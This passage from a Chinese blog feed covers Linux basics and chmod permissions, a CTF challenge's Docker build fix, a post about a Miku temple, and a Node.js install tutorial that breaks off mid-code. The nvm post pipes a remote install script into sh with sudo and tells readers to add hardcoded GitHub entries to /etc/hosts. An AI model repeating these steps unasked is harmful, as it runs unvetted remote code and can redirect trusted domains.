<code>/lib</code> 目录，这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。<br>几乎所有的应用程序都需要用到这些共享库。</p><!-- 介绍各个目录的作用 --><p>这张图中的箭头是在表示某些目录之间的关系。</p><p>先来看根目录下的 <code>/bin</code>，bin 是 <code>binary</code> 的缩写，这个目录下存放着一些最基本的命令，比如 <code>ls</code>、<code>cp</code>、<code>mv</code>、<code>rm</code> 等等。这些命令在系统启动时就会用到，可以被当前系统下所有用户使用。<br>与 bin 相连的箭头指向了 <code>/usr/bin</code>，这个目录下存放着一些用户级的命令，比如 <code>vim</code>、<code>gcc</code> 等，这些命令只能被当前用户使用。</p><p>类似的还有 <code>/sbin</code> 和 <code>/usr/sbin</code>。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>讲完前面这些，我们就可以来说说 Linux 常用的一些指令了。</p><p><code>ls</code>用来列出目录下的所有文件和目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line">ls -l</span><br><span class="line">ls &lt;path&gt;</span><br></pre></td></tr></table></figure><p><code>cd</code>用于切换目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~ </span><br><span class="line">cd ..</span><br><span class="line">cd -</span><br><span class="line">cd &lt;path&gt;</span><br></pre></td></tr></table></figure><p><code>mkdir</code> 用于创建目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &lt;name&gt;</span><br><span class="line">mkdir –p &lt;name&gt;</span><br></pre></td></tr></table></figure><p><code>cp</code> 用于复制文件或目录到指定位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &lt;src&gt; &lt;dst&gt;</span><br><span class="line">cp –r &lt;src&gt; &lt;dst&gt;</span><br></pre></td></tr></table></figure><p><code>mv</code> 用于移动文件或目录到指定位置，这个指令也可以用来给某个文件或目录重命名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv &lt;src&gt; &lt;dst&gt;</span><br></pre></td></tr></table></figure><p><code>rm</code> 用于删除文件或目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm &lt;target&gt;</span><br><span class="line">rm –r &lt;target&gt;</span><br><span class="line">rm –f &lt;target&gt;</span><br></pre></td></tr></table></figure><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p>在多用户计算机系统的管理中，权限是指某个特定用户具有特定的系统资源使用权利。</p><p>个人主机大家一般不会管这么多，通常都是直接使用管理员身份登陆了，因为个人计算机的使用者一般都是大家可以信任的人。<br>而在服务器上就不是这种情况。服务器上的用户可能彼此之间并不熟悉，而服务器中又往往存储着各种各样的资源，有些资源你不希望别的用户看到。<br>服务器中的数据越重要，价值越高，往往服务器中对权限的设定就要越详细，用户的分级也要越明确。</p><p>与 windows 不同，Linux 为每个文件都设置了很多属性，最大的作用就是维护数据安全。<br>举个简单的例子，在你的 Linux 系统中，和系统服务相关的文件通常只有 root 用户才能读或写。<br>就拿 <code>/etc/shadow</code> 这个文件来说，此文件记录了系统中所有用户的密码数据，非常重要，因此绝不能让任何人读取（否则密码数据会被窃取），只有 root 才可以有读取权限。</p><p>再比如说，本来 root 用户才能做的开关机、新增或删除用户等命令，一旦允许任何人拥有这些权限，系统就可能会经常莫名其妙的挂掉。<br>而且，万一 root 用户的密码被其他人获取，他们就可以登录你的系统，从事一些只有 root 用户才能执行的操作，这是绝对不允许发生的。</p><p>因此，在服务器上，绝对不是所有的用户都使用 root 身份登录，而要根据不同的工作需要和职位需要，合理分配用户等级和权限等级。</p><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><p>Linux 系统中，我们可以使用上文提到过的 <code>ls -al</code> 查看当前目录下所有文件的权限属性。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015122718.png" alt="ls -al 指令"></p><p>在这些信息中，最左侧这一列就是文件的权限属性，它由 10 个字符组成。</p><p>左侧 10 个字符，分为四部分，第一个字符表示文件类型，后面每部分 3 个字符，分别代表了所有者权限、所有者所在组权限、其他用户权限。</p><p>文件类型共有以下可能的值：</p><table><thead><tr><th align="center"><code>d</code></th><th align="center"><code>-</code></th><th align="center"><code>l</code></th><th align="center"><code>b</code></th><th align="center"><code>c</code></th><th align="center"><code>s</code></th><th align="center"><code>p</code></th></tr></thead><tbody><tr><td align="center">目录</td><td align="center">普通文件</td><td align="center">链接文件</td><td align="center">块设备</td><td align="center">字符设备</td><td align="center">套接字</td><td align="center">管道</td></tr></tbody></table><p>文件权限共有以下可能的值，所有者、所有组、其他用户权限都一样：</p><table><thead><tr><th align="center"><code>r</code></th><th align="center"><code>w</code></th><th align="center"><code>x</code></th><th align="center"><code>-</code></th></tr></thead><tbody><tr><td align="center">读权限，用数字4表示</td><td align="center">写权限，用数字2表示</td><td align="center">执行权限，用数字1表示</td><td align="center">无权限，用数字0表示</td></tr></tbody></table><p>了解这些属性值之后，我们举个例子来讲解一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x   3 root root       4096  9月 11 22:23 home</span><br></pre></td></tr></table></figure><p>比如我们的 <code>/home</code> 目录，它的权限属性是 <code>drwxr-xr-x</code>，表示这是一个目录文件，这个目录可以被所有者读取、写入和执行，而属于同一组的用户和其他用户只能读取和执行它。</p><h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><p>我们可以使用 <code>chmod</code> 指令来修改文件的权限属性。一般有两种方式，一种是符号模式，一种是绝对模式。</p><h4 id="符号模式"><a href="#符号模式" class="headerlink" title="符号模式"></a>符号模式</h4><p>我们可以使用以下格式的指令去修改文件的权限属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> [ugoa][+-=][rwx] filename</span><br></pre></td></tr></table></figure><p>第一个参数是权限修改的范围，第二个参数是权限的操作，第三个参数是权限的类型。</p><p>这里的第一个参数可以是以下四个字母中的任意一个：</p><ul><li><code>u</code> 表示文件的所有者</li><li><code>g</code> 表示文件的所属组</li><li><code>o</code> 表示其他用户</li><li><code>a</code> 表示所有用户，相当于 <code>ugo</code> 的合集</li></ul><p>第二个符号参数可以是以下三个符号中的任意一个：</p><ul><li><code>+</code> 添加权限</li><li><code>-</code> 删除权限</li><li><code>=</code> 设置权限</li></ul><p>第三个符号参数就是我们前面说过的 <code>rwx</code>，分别表示读、写、执行权限。</p><p>直接看使用案例可能更直观一些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x filename</span><br><span class="line"><span class="built_in">chmod</span> g-w filename</span><br><span class="line"><span class="built_in">chmod</span> o=rw- filename</span><br></pre></td></tr></table></figure><h4 id="绝对模式"><a href="#绝对模式" class="headerlink" title="绝对模式"></a>绝对模式</h4><p>由于权限中 rwx，其中一种权限只有存在和不存在两种状态，每种权限可以用一个 bit 来表示，<code>0</code> 表示无权限，<code>1</code> 表示有权限，rwx 只要三个 bit 表示。<br>三个 bit 表示的一个二进制数即可表示rwx的情况。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015141918.png" alt="权限原理"></p><p>求和之后，我们可以得到一个三位的八进制数，这个数就是我们要设置的权限。</p><p>因此，我们可以使用一个三位的八进制数来表示权限，比如 <code>777</code>，这个数的二进制表示为 <code>111 111 111</code>，表示所有者、所属组和其他用户都有读、写、执行权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 filename</span><br></pre></td></tr></table></figure><h3 id="其他相关指令"><a href="#其他相关指令" class="headerlink" title="其他相关指令"></a>其他相关指令</h3><p>除了 <code>chmod</code> 之外，还有一些指令用于 Linux 系统的权限管理，比如 <code>chown</code>、<code>chgrp</code> 等等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> user2 filename</span><br><span class="line"><span class="built_in">chgrp</span> group2 filename</span><br></pre></td></tr></table></figure><p>这两个指令分别用于修改文件的所有者和所属组，使用的频率比较低，用起来也比较简单，大家知道就好。</p><h2 id="更多的知识"><a href="#更多的知识" class="headerlink" title="更多的知识"></a>更多的知识</h2><p>Linux 操作系统先讲这么多，更多的知识就留给大家自己去探索了。</p><p>大家如果想看一些 Linux 教程书籍的话，推荐《鸟哥的 Linux 私房菜》，这本书是 Linux 界的经典书籍，内容详实，适合初学者阅读。<br>学校图书馆和协会里也都有，欢迎大家来协会线下借阅。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015143017.png" alt="鸟哥的Linux私房菜"></p><p>这些知识光听没什么用，大家还是要自己动手去实践，自己安装一个 Linux，多玩一玩，基本就能掌握个七七八八了。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建Docker镜像时遇到的问题</title>
      <link href="/2023/10/01/2023/docker-qa-01/"/>
      <url>/2023/10/01/2023/docker-qa-01/</url>
      
        <content type="html"><![CDATA[<p>HGAME-MINI2023 里的一道题目，我没法直接构建附件里给出的镜像，遇到了一点小问题。最后顺利解决了，这里略做记录。<br>本篇文章未涉及解题思路，给出的代码都为附件中所提供。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>题目名称 <code>unzip? or not</code>，给出了 <code>Dockerfile</code> 和 <code>docker-compose.yml</code> 文件。<br>为了方便测试 payload，我想直接在本地起一个服务，但在执行 <code>sudo docker-compose up -d</code> 时遇到了两个报错。</p><p>先看看源文件：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:8080&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.16</span> as builder</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /src</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o app</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:devel</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y unzip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /src/app /app/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> ./app</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><h2 id="ubuntu-devel-软件仓库失效"><a href="#ubuntu-devel-软件仓库失效" class="headerlink" title="ubuntu:devel 软件仓库失效"></a>ubuntu:devel 软件仓库失效</h2><p>看看报错情况：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231014141024.png" alt="报错信息"></p><p>当我们在 ubuntu:devel 中执行 <code>apt-gte update</code> 指令时报错，提示无法找到当前 <code>ubuntu</code> 版本的软件仓库。</p><blockquote><p>ubuntu:devel 代表了 Ubuntu 的开发版 Docker 镜像。</p></blockquote><p>我起初的想法是检查网络环境以及尝试换源，试了试发现都不行。</p><p>然后找到 <em>stackExchange</em> 上的一个 <a href="https://serverfault.com/questions/1106694/unable-to-run-apt-update-on-ubuntu-21-10">帖子</a>，很相似的问题。解决办法也比较简单，手动替换镜像中的软件仓库链接即可，多添两句指令的事儿。将 <code>Dockerfile</code> 修改为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.16</span> as builder</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /src</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o app</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:devel</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i -r <span class="string">&#x27;s/([a-z]&#123;2&#125;.)?archive.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i -r <span class="string">&#x27;s/security.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y unzip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt clean</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /src/app /app/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> ./app</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>事后，我进入到构建好的容器中，使用 <code>cat /etc/os-release</code> 检查了当前 <code>ubuntu:devel</code> 指向的 ubuntu 版本，发现是 <code>ubuntu:21.10</code>。</p><p>而根据 ubuntu 官网的一篇 <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">通知</a>，<br><code>Ubuntu 21.10</code> 于 2022 年 7 月 14 日停止支持，软件仓库也不再更新，并在段时间内归档到 <code>old-releases.ubuntu.com</code> 中。</p><p>这也就是我们直接使用 <code>apt update</code> 指令时会报错的原因。</p><h2 id="go-get-timeout"><a href="#go-get-timeout" class="headerlink" title="go get timeout"></a>go get timeout</h2><p>同样是先看看报错：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231014143720.png" alt="报错信息"></p><p>这个问题就比较简单了，处于某些原因我们无法直接访问 <code>golang.org</code>，所以 <code>go get</code> 指令无法正常执行。</p><p>在 <code>Dockerfile</code> 中设置代理即可。在文件中添加下面的指令：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure><p>之后就没有阻碍啦，使用 <code>sudo docker-compose up -d</code> 即可在本地部署一个题目服务。</p><hr><p>以上就是我遇到的两个问题，<code>go get</code> 代理问题其实很早就碰到过，这里也一并顺手记录下来。</p><p>最后能正常使用的完整版 Dockerfile 如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.16</span> as builder</span><br><span class="line"><span class="keyword">ENV</span> GOPROXY=https://goproxy.cn</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /src</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o app</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:devel</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i -r <span class="string">&#x27;s/([a-z]&#123;2&#125;.)?archive.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i -r <span class="string">&#x27;s/security.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y unzip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt clean</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /src/app /app/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> ./app</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>以上。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> QA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>既见未来，为何不拜</title>
      <link href="/2023/09/29/2023/miku-temple/"/>
      <url>/2023/09/29/2023/miku-temple/</url>
      
        <content type="html"><![CDATA[<p>阿菇发现了一个有趣的账号。第一眼看到时愣了一下，发现是赛博菩萨……或者说赛博佛祖？</p><div align='center' style='margin:20px;'>    <img style='height:320px;' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230904095726018.png' /></div><p>这个人好像是在一个寺庙里供奉初音未来，担任住持，经常拿些手办或者海报一类的周边，然后拜来拜去。可以先来张图片感受一下 😋：</p><div align='center' style='margin:20px;'>    <img style='height:500px;' src='https://pbs.twimg.com/media/Dt5vGGKUwAApEJS?format=jpg&name=large' />    <p style='color:#39C5BB;'>南無摩慈訶廬初音大菩薩</p></div><p>阿菇确实觉得初音是二次元文化的一个很具有代表性的人物，也很喜欢初音🥰，也大概知道初音未来在全球的热度，但没想到真的有供奉初音未来的寺庙。感觉是一个诡异与有趣并存的事情。</p><p>没有细致的翻帖子，只知道这神人本来应该是<a href="https://twitter.com/miraizi/status/996176962472194048">有工作的，在公司正常上班</a>，但不知道为什么出家当了和尚，开始供奉初音菩萨🎐。中间这段经历确实没有找到，想要探清缘由感觉需要去翻霓虹本土的一些常用社交网站。在推上能找到的这人最早的帖子是 2018年05月16日，是晒了几张供奉初音的照片：</p><div align='center' style='margin:20px;'>    <img style='height:320px;' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230904095034409.png' /></div><p>之后就是晒其他的照片，参加线下活动什么的，遇到初音就拜一拜 🙏，中间还看他在到处巡游，还到某些大学里面讲过课，也不知道在讲些什么。</p><p>在 2018年09月 的时候，有中国人给这个和尚🖌️画了小漫画，有人转给了这个和尚，和尚也发了条帖子。</p><p>除了供奉初音未来之外，感觉这和尚挺正经的（至少在推文上看来如此），经常发帖子普及佛法相关知识，在未来寺里担任住持，抄经诵佛、敲钟祈愿啥的都有在做，</p><p><img src="https://pbs.twimg.com/media/DpS3kIKU4AAiNPD?format=jpg&name=small"></p><p>不知道霓虹那边是不是这样叫，阿菇也不了解宗教。</p><p>然后呢，翻着翻着就找到了他在另外一个平台上的账号，你可以从这个链接进行访问：</p><p><a href="https://twpf.jp/miraizi">👉miraizi’s Profile</a>。</p><p><img src="https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230904105326127.png" alt="image-20230904105326127"></p><p>从内容上讲，感觉比在小蓝鸟上更正式一些。未来寺庙的创始、教义挺齐全的。也明确说了自己是在 2015年09月04日 于推特上宣布未来寺的成立。另外，从教义内容来看，他不仅仅是在拜初音未来，也在拜其他 VOICEROID 的人物，以初音未来命名这个教派和寺庙是因为初音未来在整个 VOICEROID 中的卓越地位（无可争议）。当然，也是因为他个人很喜欢初音。</p><p>阿菇止步于此。阿菇不想去探寻这个和尚是不是在炒热度博关注，有没有干过什么离谱的事情，有没有什么收益。我觉得没有必要🤔，这种事情了解到这种层面就够了。如果读者有兴趣，可以沿着阿菇的路线继续探索。</p><p>最后，用这个和尚对未来寺的一句介绍来结尾吧：</p><div align='center' style='margin:50px;font-size:14px;'>    <p title='我希望VOCALOID的声音如柑橘的香味一样甜美，成为一盏灯，长久地照亮我们每个人的人生道路'>        の香りのように美しいVOCALOIDの声が示し、それが永くひとりひとりの生きる路（みち）を照らす燈明であるように」    </p></div>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACG </tag>
            
            <tag> Miku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过nvm配置Node.js开发环境</title>
      <link href="/2023/09/17/2023/nvm-node/"/>
      <url>/2023/09/17/2023/nvm-node/</url>
      
        <content type="html"><![CDATA[<p>阿菇之前遇到过这个问题，顺利地解决了。这里补一篇博客，说说具体的操作步骤。本教程的测试环境为 <code>Ubuntu22.04</code>，理论上适用于大多数 Linux 系统（在正确安装相关工具的前提下）。</p><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>关于 Node.js，我觉得它官网的描述就是最准确的：</p><blockquote><p>Node.js® is an open-source, cross-platform JavaScript runtime environment.</p></blockquote><p>在我们使用 Node.js 开发 Web 应用或者搭建靶场的时候，会有指定的版本要求，这需要我们能够迅速准确的切换我们当前的 Node.js 版本。<code>nvm</code> 就是一个优秀的 node.js 版本管理工具，允许我们在同一台机器上方便地安装切换各版本的 Node.js🥰。</p><h2 id="安装nvm"><a href="#安装nvm" class="headerlink" title="安装nvm"></a>安装nvm</h2><p>执行以下操作之前，如果你已经通过其他渠道下载了 Node.js，请将其卸载，否则会出现冲突问题。本篇文章不会介绍如何解决冲突造成的问题。</p><p>这里只介绍一种最通用的办法——使用 <code>curl</code> 拉取官方安装包📦并执行。</p><p>首先在你的系统安装 curl，这是一个常用的命令行工具，用于发出网络请求然后获取数据。执行以下命令安装 nvm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | sh</span><br></pre></td></tr></table></figure><p>稍等片刻，当你看到以下提示时，证明你已经成功安装了 nvm。之后按照提示重启终端或者使用指令更新环境变量即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">=&gt; nvm is already installed <span class="keyword">in</span> /root/.nvm, trying to update the script</span><br><span class="line">=&gt; nvm <span class="built_in">source</span> string already <span class="keyword">in</span> /root/.profile</span><br><span class="line">=&gt; bash_completion <span class="built_in">source</span> string already <span class="keyword">in</span> /root/.profile</span><br><span class="line">=&gt; Close and reopen your terminal to start using nvm or run the following to use it now:</span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/.nvm&quot;</span></span><br></pre></td></tr></table></figure><p>重启终端或执行对应指令后，我们使用 <code>nvm -v</code> 检验是否成功更新环境变量，如果看到控制台中输出了版本信息，则表示环境变量更新成功，也表明你的 nvm 能够正常使用啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvm --version</span><br><span class="line"><span class="comment"># 0.35.3</span></span><br></pre></td></tr></table></figure><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h3><p>当你使用 curl 拉取 nvm 安装时，可能会遇到以下报错信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>如果遇到了，请在 <code>/etc/hosts</code> 文件的末尾中添加下面的 dns 解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">199.232.68.133 raw.githubusercontent.com</span><br><span class="line">199.232.68.133 user-images.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars2.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars1.githubusercontent.com</span><br></pre></td></tr></table></figure><p>然后重新执行上面的指令，拉取安装包并进行安装。</p><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>使用 nvm 安装对应版本的 Node.js 很方便。首先，使用以下指令查看可用的 node 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm ls-remote</span><br></pre></td></tr></table></figure><p>你可以从输出中看到从 <code>v0.1.14</code> 到 <code>v20,5.1</code> 之间几乎所有的版本。找到你需要的版本，通过以下指令进行安装，这里拿 <code>v20.0.0</code> 做示范，安装其他版本的 node 同理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install v20.0.0</span><br></pre></td></tr></table></figure><p>稍等片刻后，看到 <code>Checksums matched!</code> 即代表已经安装成功。这时一般会将你目前的 node 版本自动切换为刚下载的版本。</p><p>你可以使用以下指令查看当前使用 node 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v </span><br><span class="line"><span class="comment"># v20.0.0</span></span><br></pre></td></tr></table></figure><p>到这里就已经基本结束啦🥰！下面会再给出一些常用的 nvm 指令，基本能满足日常学习所需：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装指定版本的 node</span></span><br><span class="line">nvm install &lt;version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定版本的 node</span></span><br><span class="line">nvm use &lt;version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出已安装的所有版本的 node</span></span><br><span class="line">nvm <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有可用（可安装）的 node</span></span><br><span class="line">nvm ls-remote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前使用的 node 版本</span></span><br><span class="line">nvm current</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>以下步骤适用于在本地搭建 Node,js 开发环境的初学者，如果你是在云服务器或者 docker 容器中安装的 nvm，我相信你没有必要看这部分内容😋</p><p>编写一个原生的 Node.js web 应用做测试。</p><p>先使用 vim 在当前目录创建一个 <code>app.js</code>，然后将以下内容复制粘贴进去，保存退出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span 